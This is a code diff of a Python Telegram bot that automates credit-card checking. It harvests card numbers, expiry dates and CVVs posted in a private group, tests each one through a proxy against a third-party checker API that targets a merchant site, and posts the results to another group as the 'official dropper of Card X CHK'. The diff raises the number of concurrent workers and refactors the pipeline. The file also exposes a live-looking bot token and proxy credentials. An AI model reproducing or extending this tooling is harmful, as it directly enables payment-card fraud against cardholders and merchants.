@@ -15,84 +15,83 @@ BOT_TOKEN = "7991358662:AAGQIQFKzKc4bHwJM_Sgt5MZ4nJZ4PhTpes"
 
 PRIVATE_GROUP_ID = -1002682944548
 TARGET_GROUP_ID = -1002968335063
-ADMIN_ID = 8493360284  # Replace with your Telegram user ID
+ADMIN_ID = 8493360284  # Your Telegram ID
 
 API_URL = "https://autosh.arpitchk.shop/puto.php"
 SITE = "https://jasonwubeauty.com"
 PROXY = "142.111.48.253:7030:fvbysspi:bsbh3trstb1c"
 
 CARD_REGEX = re.compile(r"(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})")
-NUM_WORKERS = 5  # Number of concurrent workers
+NUM_WORKERS = 10  # concurrent workers
 
-# ---------------- INIT CLIENTS ----------------
+# ---------------- CLIENTS ----------------
 user_client = TelegramClient(StringSession(SESSION_STRING), api_id, api_hash)
 bot_client = Bot(token=BOT_TOKEN)
 
 # ---------------- STATE ----------------
 dropping_enabled = False
 cards_queue = asyncio.Queue()
+session = None  # aiohttp session
 
 # ---------------- FUNCTIONS ----------------
 async def process_card(card: str):
-    """Send card to API and post result to official group with logs"""
-    print(f"[+] Processing card: {card}")
+    """Send card to API and forward result if dropping enabled"""
+    global session
     params = {"site": SITE, "cc": card, "proxy": PROXY}
 
-    async with aiohttp.ClientSession() as session:
-        try:
-            async with session.get(API_URL, params=params) as resp:
-                data = await resp.json()
-        except Exception as e:
-            data = {"Response": f"API Error: {e}", "cc": card, "Price": "-", "TotalTime": "-"}
-            print(f"❌ API error for card {card}: {e}")
+    try:
+        async with session.get(API_URL, params=params, timeout=15) as resp:
+            data = await resp.json()
+    except Exception as e:
+        data = {"Response": f"API Error: {e}", "cc": card, "Price": "-", "TotalTime": "-"}
+        print(f"❌ API error for card {card}: {e}")
 
+    # Escape for MarkdownV2
     cc = escape_markdown(str(data.get('cc')), version=2)
     price = escape_markdown(str(data.get('Price')), version=2)
     response = escape_markdown(str(data.get('Response')), version=2)
     msg = f"CC: `{cc}`\nPrice: {price}\nResponse: {response}"
 
-    try:
-        await bot_client.send_message(chat_id=TARGET_GROUP_ID, text=msg, parse_mode="MarkdownV2")
-        print(f"[✓] Sent to official group: {card} -> {data.get('Response')}")
-    except Exception as e:
-        print(f"❌ Failed to send message for card {card}: {e}")
+    if dropping_enabled:
+        try:
+            await bot_client.send_message(chat_id=TARGET_GROUP_ID, text=msg, parse_mode="MarkdownV2")
+            print(f"[✓] Sent: {card} -> {data.get('Response')}")
+        except Exception as e:
+            print(f"❌ Failed to send card {card}: {e}")
+    else:
+        print(f"[i] Dropping disabled: {card} -> {data.get('Response')}")
 
 async def card_worker(worker_id: int):
-    """Worker to process queued cards concurrently"""
+    """Worker to process queued cards"""
     print(f"[Worker-{worker_id}] Started")
     while True:
         card = await cards_queue.get()
-        if dropping_enabled:
-            await process_card(card)
-        else:
-            print(f"[Worker-{worker_id}] Card queued but dropping disabled: {card}")
+        await process_card(card)
         cards_queue.task_done()
 
-# ---------------- EVENT HANDLER ----------------
+# ---------------- TELETHON EVENT ----------------
 @user_client.on(events.NewMessage(chats=PRIVATE_GROUP_ID))
 async def card_listener(event):
     text = event.message.message
     if not text:
         return
-
     matches = CARD_REGEX.findall(text)
     if not matches:
         return
-
     for match in matches:
         card_str = "|".join(match)
         await cards_queue.put(card_str)
-        print(f"[+] Card received and queued: {card_str}")
+        print(f"[+] Card queued: {card_str}")
 
-# ---------------- BOT COMMANDS ----------------
+# ---------------- TELEGRAM COMMANDS ----------------
 async def start(update: "Update", context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
-    chat_id = update.effective_chat.id
     if user_id == ADMIN_ID:
-        await context.bot.send_message(chat_id=chat_id, text="✅ Send me /drop to start dropping checked CC")
-        print(f"[BOT] Admin {user_id} started the bot")
+        await context.bot.send_message(chat_id=update.effective_chat.id,
+                                       text="✅ Send /drop to start dropping checked CC")
+        print(f"[BOT] Admin {user_id} sent /start")
     else:
-        await context.bot.send_message(chat_id=chat_id,
+        await context.bot.send_message(chat_id=update.effective_chat.id,
                                        text="The OFFICIAL dropper of Card X CHK\nAccess Denied — bot only for official group")
         print(f"[BOT] Unauthorized /start by {user_id}")
 
@@ -118,15 +117,19 @@ async def stop(update: "Update", context: ContextTypes.DEFAULT_TYPE):
 
 # ---------------- MAIN ----------------
 async def main():
-    await user_client.start()
-    print("✅ Telethon client started, listening to private group...")
+    global session
+    session = aiohttp.ClientSession()  # Single shared session
 
-    # Start multiple background card workers
+    # Start Telethon client
+    await user_client.start()
+    print("✅ Telethon client started. Listening to private group...")
+
+    # Start workers
     for i in range(NUM_WORKERS):
         asyncio.create_task(card_worker(i+1))
     print(f"[+] {NUM_WORKERS} card workers running...")
 
-    # Start python-telegram-bot
+    # Start Telegram bot
     app = ApplicationBuilder().token(BOT_TOKEN).build()
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("drop", drop))
@@ -135,10 +138,10 @@ async def main():
     await app.initialize()
     await app.start()
     await app.updater.start_polling()
-    print("✅ Telegram bot started. Waiting for commands...")
+    print("✅ Telegram bot started. Waiting for admin commands...")
 
-    # Keep Telethon running
+    # Keep running Telethon
     await user_client.run_until_disconnected()
 
 if __name__ == "__main__":
-    asyncio.get_event_loop().run_until_complete(main())
+    asyncio.run(main())
